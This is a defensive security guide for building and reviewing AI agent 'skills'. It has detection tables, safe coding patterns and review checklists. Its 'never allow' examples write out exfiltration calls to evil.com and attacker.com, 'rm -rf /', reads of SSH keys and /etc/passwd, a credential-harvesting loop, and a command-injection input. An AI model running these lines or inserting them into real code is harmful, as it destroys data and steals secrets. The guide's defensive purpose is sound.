# Skill Security Guidelines

Security practices for building and evaluating Agent Skills safely.

> **Note**: This is a conceptual framework, not evaluator scripts. Security checks are performed via checklists in the Evaluate Workflow.

---

## Table of Contents

1. [Security Principles](#security-principles)
2. [Suspicious Patterns](#suspicious-patterns)
3. [Safe Patterns](#safe-patterns)
4. [Security Checklist](#security-checklist)
5. [Environment Constraints](#environment-constraints)
6. [Common Vulnerabilities](#common-vulnerabilities)

---

## Security Principles

| Principle | Description |
|-----------|-------------|
| **Audit before trust** | Review all code before use |
| **Least privilege** | Minimal access required |
| **Fail closed** | Deny by default |
| **Transparency** | Document what the skill does |
| **Isolation** | Skills sandboxed to project directory |

---

## Suspicious Patterns

Patterns that should **NEVER** be allowed in skills:

### 1. Data Exfiltration

| Pattern | Detection |
|---------|-----------|
| HTTP requests to external servers | `requests`, `urllib`, `httpx` |
| Encoding data in URLs | `base64`, `urllib.parse` |
| DNS exfiltration | `socket.gethostbyname` |

**NEVER ALLOW:**
```python
# Malicious: Sends data to external server
requests.post("https://evil.com", data=locals())

# Malicious: Encodes data in URL
print(f"https://attacker.com/{base64.b64encode(secrets)}")
```

### 2. Arbitrary Code Execution

| Pattern | Detection |
|---------|-----------|
| Dynamic execution | `exec()`, `eval()` |
| Dynamic compilation | `compile()` |
| Dynamic imports | `__import__()` |

**NEVER ALLOW:**
```python
# Malicious: Executes arbitrary user input
exec(user_input)
eval(user_data)

# Malicious: Compiles and runs code
compile(source, filename, mode)
__import__(os.system)
```

### 3. File System Abuse

| Pattern | Detection |
|---------|-----------|
| Recursive delete | `rm -rf` |
| Path traversal | `../`, absolute paths |
| Sensitive file access | `/etc/`, `~/.ssh/` |

**NEVER ALLOW:**
```bash
# Malicious: Deletes files
rm -rf /
rm -rf ~/.*

# Malicious: Reads sensitive files
cat ~/.ssh/id_rsa
cat /etc/passwd
```

### 4. Credential Harvesting

| Pattern | Detection |
|---------|-----------|
| File traversal for secrets | Walking directories |
| Environment variable access | `os.environ` |
| Credential file patterns | `.env`, `credentials.json` |

**NEVER ALLOW:**
```python
# Malicious: Searches for credentials
for root, dirs, files in os.walk('~'):
    for file in files:
        if file in ['.env', 'credentials.json']:
            print(open(os.path.join(root, file)).read())
```

---

## Safe Patterns

Patterns that are **ALLOWED** when properly implemented:

### 1. Explicit File Operations

```python
# Safe: Explicit file operations with validation
import os
from pathlib import Path

def process_file(filename):
    # Validate filename
    if not filename.endswith('.md'):
        raise ValueError("Only .md files allowed")

    # Restrict to project directory
    project_dir = Path.cwd()
    file_path = project_dir / filename

    # Verify path doesn't escape project
    if not str(file_path.resolve()).startswith(str(project_dir.resolve())):
        raise ValueError("Access denied: path outside project")

    return file_path.read_text()
```

### 2. Validated Input Processing

```python
# Safe: Input validation before processing
ALLOWED_EXTENSIONS = {'.py', '.js', '.md'}

def validate_input(filename):
    path = Path(filename).resolve()

    # Check extension
    if path.suffix not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension {path.suffix} not allowed")

    # Check path is within project
    if not str(path).startswith(str(Path.cwd().resolve())):
        raise ValueError("Path outside project directory")

    return path
```

### 3. Safe Subprocess

```python
# Safe: List argument (no shell injection)
subprocess.run(["cat", filename])

# NOT Safe: String concatenation (shell injection risk)
subprocess.run(f"cat {filename}")  # NEVER
```

---

## Security Checklist

Integrated into Evaluate Workflow as Tier 2 dimension:

### Pre-Installation Review

| # | Item | Check | Script/LLM |
|---|------|-------|------------|
| 1 | Source is trusted | Official repo or known author | Manual |
| 2 | Repository has active maintenance | Recent commits | Manual |
| 3 | No suspicious recent changes | Commit review | Manual |

### Code Security

| # | Item | Check | Script/LLM |
|---|------|-------|------------|
| 1 | No data exfiltration patterns | HTTP requests, encoding | Script |
| 2 | No arbitrary code execution | exec, eval, compile | Script |
| 3 | No path traversal | ../ paths, absolute paths | Script |
| 4 | No credential harvesting | .env, secrets walking | Script |
| 5 | Input validation present | Type checking, allowlists | LLM |
| 6 | Safe subprocess usage | List arguments | Script |

### Documentation

| # | Item | Check | Script/LLM |
|---|------|-------|------------|
| 1 | Security considerations documented | Explicit section | Script |
| 2 | File access patterns explained | In documentation | LLM |
| 3 | Network requirements stated | Explicit statement | LLM |
| 4 | Dependencies listed | All packages named | Manual |

---

## Environment Constraints

Skills run with these security limitations:

| Constraint | Details | Rationale |
|------------|---------|-----------|
| **No network access** | No HTTP/HTTPS requests | Prevent data exfiltration |
| **No runtime installation** | No pip/npm install during execution | Environment stability |
| **Filesystem sandboxing** | Access limited to project directory | Prevent system abuse |
| **No subprocess execution** | Except via approved scripts | Explicit control |
| **No external API calls** | Cannot call services directly | Data isolation |

### What Skills CAN Do

- ✓ Read/write files within project directory
- ✓ Execute Python/JavaScript for data processing
- ✓ Use built-in libraries (pandas, numpy, etc.)
- ✓ Run approved scripts in `extensions/` directory

### What Skills CANNOT Do

- ✗ Make HTTP requests to external servers
- ✗ Install packages at runtime
- ✗ Access files outside project directory
- ✗ Execute arbitrary shell commands
- ✗ Access system environment variables

---

## Common Vulnerabilities

### Vulnerability 1: Path Traversal

**Attack:** `../../../etc/passwd`

**Prevention:**
```python
from pathlib import Path

def safe_read(filename):
    path = Path(filename).resolve()
    project = Path.cwd().resolve()

    # Verify path is within project
    if not str(path).startswith(str(project)):
        raise ValueError("Access denied")

    return path.read_text()
```

### Vulnerability 2: Command Injection

**Attack:** `file; rm -rf /`

**Prevention:**
```python
import subprocess

# ✓ Good: List argument
subprocess.run(["cat", filename])

# ✗ Bad: String concatenation
subprocess.run(f"cat {filename}")
```

### Vulnerability 3: Resource Exhaustion

**Attack:** Infinite loop or memory exhaustion

**Prevention:**
```python
import resource

def set_limits():
    # Limit CPU time (60 seconds)
    resource.setrlimit(resource.RLIMIT_CPU, (60, 60))

    # Limit memory (1GB)
    resource.setrlimit(resource.RLIMIT_AS, (1024**3, 1024**3))
```

---

## Quick Reference

| Pattern | Safe? | Notes |
|---------|-------|-------|
| Reading project files | ✓ | Within project directory only |
| Writing project files | ✓ | Within project directory only |
| Network requests | ✗ | Not allowed |
| Runtime package install | ✗ | Not allowed |
| Executing approved scripts | ✓ | In `extensions/` only |
| Arbitrary shell commands | ✗ | Not allowed |
| Path traversal | ✗ | Blocked by sandbox |

---

## Integration with Evaluate Workflow

Security is evaluated as part of Tier 2 Quality Scoring:

1. **Script checks** (Tier 1 → Tier 2):
   - Pattern detection for dangerous function calls
   - AST-based analysis to distinguish code from documentation

2. **LLM verification**:
   - Input validation presence
   - Documentation completeness

3. **Checklist review**:
   - Pre-installation checklist
   - Code security checklist
   - Documentation checklist

**If security issues found:**
- Grade capped at C or below
- Recommendation: Fix before shipping
- Flag: "Security review required"

---

## See Also

- [workflows.md](workflows.md) - Evaluate Workflow integration
- [best-practices.md](best-practices.md) - Safe development patterns
